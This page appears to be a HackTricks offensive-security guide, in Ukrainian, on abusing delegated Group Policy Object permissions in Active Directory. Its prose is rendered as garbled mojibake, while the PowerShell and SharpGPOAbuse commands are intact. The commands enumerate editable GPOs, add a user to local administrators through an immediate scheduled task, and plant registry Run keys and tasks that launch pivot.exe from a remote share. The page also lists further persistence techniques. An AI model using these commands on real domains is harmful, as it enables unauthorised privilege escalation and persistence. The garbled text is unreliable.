–î–æ—Å—Ç—É–ø, –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–π –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –æ–±'—î–∫—Ç–∞–º–∏ –≥—Ä—É–ø–æ–≤–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏ (GPO), –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∑–Ω–∞—á–Ω—ñ —Ä–∏–∑–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —Ç–∞–∫–∏–π —è–∫ `offense\spotless`, –º–∞—î –¥–µ–ª–µ–≥–æ–≤–∞–Ω—ñ –ø—Ä–∞–≤–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è GPO, –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, —Ç–∞–∫—ñ —è–∫ **WriteProperty**, **WriteDacl** —Ç–∞ **WriteOwner**. –¶—ñ –¥–æ–∑–≤–æ–ª–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ü—å–∫–∏—Ö —Ü—ñ–ª–µ–π, —è–∫ –≤–∏—è–≤–ª–µ–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### –í–∏–±—ñ—Ä–∫–∞ –¥–æ–∑–≤–æ–ª—ñ–≤ GPO

–î–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏—Ö GPO –º–æ–∂–Ω–∞ –ª–∞–Ω—Ü—é–∂–∏—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ cmdlets PowerSploit. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏—è–≤–∏—Ç–∏ GPO, —è–∫–∏–º–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –ø—Ä–∞–≤–æ —É–ø—Ä–∞–≤–ª—è—Ç–∏: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**–ö–æ–º–ø'—é—Ç–µ—Ä–∏ –∑ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ—é –ø–µ–≤–Ω–æ—é –ø–æ–ª—ñ—Ç–∏–∫–æ—é**: –ú–æ–∂–ª–∏–≤–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, –Ω–∞ —è–∫—ñ –∫–æ–º–ø'—é—Ç–µ—Ä–∏ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –ø–µ–≤–Ω–∞ GPO, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –∑—Ä–æ–∑—É–º—ñ—Ç–∏ –æ–±—Å—è–≥ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–≥–æ –≤–ø–ª–∏–≤—É. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**–ü–æ–ª—ñ—Ç–∏–∫–∏, –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –¥–æ –ø–µ–≤–Ω–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞**: –©–æ–± –ø–æ–±–∞—á–∏—Ç–∏, —è–∫—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –¥–æ –ø–µ–≤–Ω–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `Get-DomainGPO`.

**–û—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π–Ω—ñ –æ–¥–∏–Ω–∏—Ü—ñ –∑ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ—é –ø–æ–ª—ñ—Ç–∏–∫–æ—é**: –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π–Ω–∏—Ö –æ–¥–∏–Ω–∏—Ü—å (OU), —è–∫—ñ –ø–æ—Å—Ç—Ä–∞–∂–¥–∞–ª–∏ –≤—ñ–¥ –ø–µ–≤–Ω–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏, –º–æ–∂–Ω–∞ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `Get-DomainOU`.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è GPO - New-GPOImmediateTask

–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ GPO –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–µ–≥–∞–π–Ω–æ–≥–æ –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –∑—Ä–æ–±–ª–µ–Ω–æ –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ –≥—Ä—É–ø–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –Ω–∞ –ø–æ—à–∫–æ–¥–∂–µ–Ω–∏—Ö –∫–æ–º–ø'—é—Ç–µ—Ä–∞—Ö, –∑–Ω–∞—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### –ú–æ–¥—É–ª—å GroupPolicy - –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è GPO

–ú–æ–¥—É–ª—å GroupPolicy, —è–∫—â–æ –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π, –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ –ø–æ—Å–∏–ª—é–≤–∞—Ç–∏ –Ω–æ–≤—ñ GPO —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞–¥–Ω—ñ—Ö –¥–≤–µ—Ä–µ–π –Ω–∞ –ø–æ—à–∫–æ–¥–∂–µ–Ω–∏—Ö –∫–æ–º–ø'—é—Ç–µ—Ä–∞—Ö. –¶–µ–π –º–µ—Ç–æ–¥ –≤–∏–º–∞–≥–∞—î –æ–Ω–æ–≤–ª–µ–Ω–Ω—è GPO —Ç–∞ –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è GPO

SharpGPOAbuse –ø—Ä–æ–ø–æ–Ω—É—î –º–µ—Ç–æ–¥ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏–º–∏ GPO —à–ª—è—Ö–æ–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∑–∞–≤–¥–∞–Ω—å –∞–±–æ –∑–º—ñ–Ω–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö GPO. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≤–∏–º–∞–≥–∞—î –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ—Å–Ω—É—é—á–∏—Ö GPO –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ RSAT –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –ø–µ—Ä–µ–¥ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è–º –∑–º—ñ–Ω:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### –ü—Ä–∏–º—É—Å–æ–≤–µ –û–Ω–æ–≤–ª–µ–Ω–Ω—è –ü–æ–ª—ñ—Ç–∏–∫–∏

–û–Ω–æ–≤–ª–µ–Ω–Ω—è GPO –∑–∞–∑–≤–∏—á–∞–π –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∫–æ–∂–Ω—ñ 90 —Ö–≤–∏–ª–∏–Ω. –©–æ–± –ø—Ä–∏—Å–∫–æ—Ä–∏—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å, –æ—Å–æ–±–ª–∏–≤–æ –ø—ñ—Å–ª—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∑–º—ñ–Ω, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É `gpupdate /force` –Ω–∞ —Ü—ñ–ª—å–æ–≤–æ–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ –¥–ª—è –ø—Ä–∏–º—É—Å–æ–≤–æ–≥–æ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏. –¶—è –∫–æ–º–∞–Ω–¥–∞ –≥–∞—Ä–∞–Ω—Ç—É—î, —â–æ –±—É–¥—å-—è–∫—ñ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó GPO –±—É–¥—É—Ç—å –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –±–µ–∑ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ —Ü–∏–∫–ª—É –æ–Ω–æ–≤–ª–µ–Ω–Ω—è.

### –ü—ñ–¥ –ö–∞–ø–æ—Ç–æ–º

–ü—Ä–∏ –æ–≥–ª—è–¥—ñ –ó–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å –¥–ª—è –ø–µ–≤–Ω–æ–≥–æ GPO, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `Misconfigured Policy`, –º–æ–∂–Ω–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∑–∞–≤–¥–∞–Ω—å, —Ç–∞–∫–∏—Ö —è–∫ `evilTask`. –¶—ñ –∑–∞–≤–¥–∞–Ω–Ω—è —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∞–±–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∑ –º–µ—Ç–æ—é –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ —Å–∏—Å—Ç–µ–º–∏ –∞–±–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –∑–∞–≤–¥–∞–Ω–Ω—è, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó XML, —Å—Ç–≤–æ—Ä–µ–Ω–æ–º—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `New-GPOImmediateTask`, –Ω–∞–≤–æ–¥–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–∏–∫—É –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è - –≤–∫–ª—é—á–∞—é—á–∏ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ç–∞ –π–æ–≥–æ —Ç—Ä–∏–≥–µ—Ä–∏. –¶–µ–π —Ñ–∞–π–ª –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î, —è–∫ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å—Å—è —Ç–∞ –∫–µ—Ä—É—é—Ç—å—Å—è –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –≤ –º–µ–∂–∞—Ö GPO, –Ω–∞–¥–∞—é—á–∏ –º–µ—Ç–æ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ–≤ —è–∫ —á–∞—Å—Ç–∏–Ω–∏ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏.

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ —Ç–∞ –ì—Ä—É–ø–∏

GPO —Ç–∞–∫–æ–∂ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –Ω–∞ —Ü—ñ–ª—å–æ–≤–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö. –†–µ–¥–∞–≥—É—é—á–∏ —Ñ–∞–π–ª–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ì—Ä—É–ø –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –≥—Ä—É–ø, —Ç–∞–∫–∏—Ö —è–∫ –ª–æ–∫–∞–ª—å–Ω–∞ –≥—Ä—É–ø–∞ `administrators`. –¶–µ –º–æ–∂–ª–∏–≤–æ –∑–∞–≤–¥—è–∫–∏ –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—é –¥–æ–∑–≤–æ–ª—ñ–≤ –Ω–∞ –∫–µ—Ä—É–≤–∞–Ω–Ω—è GPO, —â–æ –¥–æ–∑–≤–æ–ª—è—î –º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –∑–º—ñ–Ω–∏ —á–ª–µ–Ω—Å—Ç–≤–∞ –≤ –≥—Ä—É–ø–∞—Ö.

–§–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó XML –¥–ª—è –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ì—Ä—É–ø –Ω–∞–≤–æ–¥–∏—Ç—å, —è–∫ —Ü—ñ –∑–º—ñ–Ω–∏ –≤–ø—Ä–æ–≤–∞–¥–∂—É—é—Ç—å—Å—è. –î–æ–¥–∞–≤—à–∏ –∑–∞–ø–∏—Å–∏ –¥–æ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É, –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–¥–∞–Ω—ñ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –Ω–∞ –≤—Å—ñ—Ö –∑–∞—á–µ–ø–ª–µ–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö. –¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–æ–ø–æ–Ω—É—î –ø—Ä—è–º–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è GPO.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –º–æ–∂–Ω–∞ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –º–µ—Ç–æ–¥–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –∞–±–æ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ –≤—Ö–æ–¥—É/–≤–∏—Ö–æ–¥—É, –∑–º—ñ–Ω–∞ –∫–ª—é—á—ñ–≤ —Ä–µ—î—Å—Ç—Ä—É –¥–ª—è –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫—É, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —á–µ—Ä–µ–∑ —Ñ–∞–π–ª–∏ .msi –∞–±–æ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π —Å–ª—É–∂–±. –¶—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –Ω–∞–¥–∞—é—Ç—å —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É —Ç–∞ –∫–µ—Ä—É–≤–∞–Ω–Ω—è —Ü—ñ–ª—å–æ–≤–∏–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏ —á–µ—Ä–µ–∑ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è GPO.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
